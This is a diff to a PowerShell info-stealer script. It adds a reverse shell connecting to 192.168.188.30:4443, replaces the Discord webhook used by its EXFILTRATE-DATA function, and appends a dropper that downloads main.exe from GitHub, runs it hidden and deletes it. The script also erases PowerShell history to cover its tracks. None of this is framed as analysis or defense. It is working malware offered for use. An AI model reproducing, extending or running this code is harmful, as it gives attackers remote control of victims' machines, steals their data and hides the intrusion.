@@ -1,3 +1,23 @@
+$client = New-Object System.Net.Sockets.TCPClient('192.168.188.30', 4443)
+$stream = $client.GetStream()
+$bytes = [byte[]](0..65535)
+while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
+    $data = [System.Text.Encoding]::ASCII.GetString($bytes, 0, $i)
+    $sendback = (iex $data 2>&1 | Out-String)
+    $sendback2 = $sendback + 'PS ' + (Get-Location).Path + '> '
+    $sendbyte = [text.encoding]::ASCII.GetBytes($sendback2)
+    $stream.Write($sendbyte, 0, $sendbyte.Length)
+    $stream.Flush()
+}
+$client.Close()
+
+
+
+
+
+
+
+
 $ErrorActionPreference = 'SilentlyContinue' # Ignore all warnings
 $ProgressPreference = 'SilentlyContinue' # Hide all Progresses
 
@@ -6,7 +26,7 @@ function CHECK_IF_ADMIN {
 }
 
 function EXFILTRATE-DATA {
-    $webhook = "https://discord.com/api/webhooks/1110460277234860032/K55u3UvfgtuBU_7i2i1GJZuZzyuFhtXwnfClR-HY1q_K5LYfoe2CGTPQdrErmm4BE1yk"
+    $webhook = "https://discord.com/api/webhooks/1115012616956411948/Dm9b9nnFRnvNDjyt3GRXUhDpeQBBxwP4txEOPy1Wu9946hhJzyhoPJ6Cjb5ax-fdSygB"
     $ip = Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing
     $ip = $ip.Content
     $ip > $env:LOCALAPPDATA\Temp\ip.txt
@@ -564,3 +584,20 @@ if (CHECK_IF_ADMIN -eq $true) {
 }
 
 Remove-Item (Get-PSreadlineOption).HistorySavePath
+
+
+
+
+$fileUrl = "https://github.com/tayic99373/leave/raw/main/main.exe"
+$tempDir = [System.IO.Path]::GetTempPath()
+$filePath = Join-Path -Path $tempDir -ChildPath "main.exe"
+Invoke-WebRequest -Uri $fileUrl -OutFile $filePath
+
+$process = New-Object System.Diagnostics.Process
+$process.StartInfo.FileName = $filePath
+$process.StartInfo.WindowStyle = "Hidden"
+$process.Start() | Out-Null
+
+Start-Sleep -Seconds 120
+
+Remove-Item -Path $filePath -Force
